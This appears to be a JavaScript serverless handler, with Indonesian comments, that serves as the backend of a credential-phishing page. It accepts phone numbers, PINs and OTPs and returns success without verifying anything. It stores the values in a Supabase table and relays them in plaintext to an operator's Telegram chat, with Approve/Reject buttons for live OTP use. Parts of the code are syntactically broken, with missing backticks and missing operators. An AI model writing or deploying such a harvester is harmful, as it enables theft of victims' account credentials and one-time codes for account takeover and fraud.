import { createClient } from '@supabase/supabase-js';

export default async function handler(req, res) {
  try {
    // Cek environment variable
    const supabaseUrl = process.env.SUPABASE_URL;
    const supabaseKey = process.env.SUPABASE_ANON_KEY;
    const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
    const adminChatId = process.env.ADMIN_CHAT_ID;

    if (!supabaseUrl || !supabaseKey) {
      console.error('Missing Supabase env vars');
      return res.status(500).json({ error: 'Server configuration error (Supabase)' });
    }

    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    if (req.method === 'OPTIONS') return res.status(200).end();

    if (req.method !== 'POST') {
      return res.status(405).json({ error: 'Method not allowed' });
    }

    const { phone, pin, otp, type } = req.body;

    // --- LOGIN ---
    if (type === 'login') {
      if (!phone || !pin) {
        return res.status(400).json({ error: 'Phone and PIN required' });
      }
      // Kirim notifikasi ke admin (opsional)
      if (telegramToken && adminChatId) {
        try {
          await fetch(https://api.telegram.org/bot${telegramToken}/sendMessage, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: adminChatId,
              text: 🔔 *User Login*\n📞 Phone: \${phone}\\n🔢 PIN: \${pin}\``,
              parse_mode: 'Markdown'
            })
          });
        } catch (e) {
          console.error('Telegram notify failed:', e);
        }
      }
      return res.status(200).json({ success: true });
    }

    // --- OTP ---
    if (!phone  !pin  !otp) {
      return res.status(400).json({ error: 'Phone, PIN, and OTP required' });
    }

    const supabase = createClient(supabaseUrl, supabaseKey);
    const { data, error } = await supabase
      .from('verifikasi_requests')
      .insert([{ phone, pin, otp, status: 'pending' }])
      .select();

    if (error) throw error;
    if (!data || data.length === 0) throw new Error('Insert failed');

    // Kirim notifikasi ke admin dengan tombol
    if (telegramToken && adminChatId) {
      try {
        const inlineKeyboard = {
          inline_keyboard: [
            [
              { text: "✅ Approve", callback_data: approve|${phone}|${pin}|${otp} },
              { text: "❌ Reject", callback_data: reject|${phone}|${pin}|${otp} }
            ]
          ]
        };
        await fetch(https://api.telegram.org/bot${telegramToken}/sendMessage, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: adminChatId,
            text: 🔔 *Permintaan Verifikasi*\n📞 Phone: \${phone}\\n🔢 PIN: \${pin}\\n🔑 OTP: \${otp}\``,
            parse_mode: 'Markdown',
            reply_markup: inlineKeyboard
          })
        });
      } catch (e) {
        console.error('Telegram OTP notify failed:', e);
      }
    }

    return res.status(201).json({ success: true, requestId: data[0].id });

  } catch (err) {
    console.error('FATAL ERROR:', err);
    return res.status(500).json({ error: err.message || 'Internal server error' });
  }
}
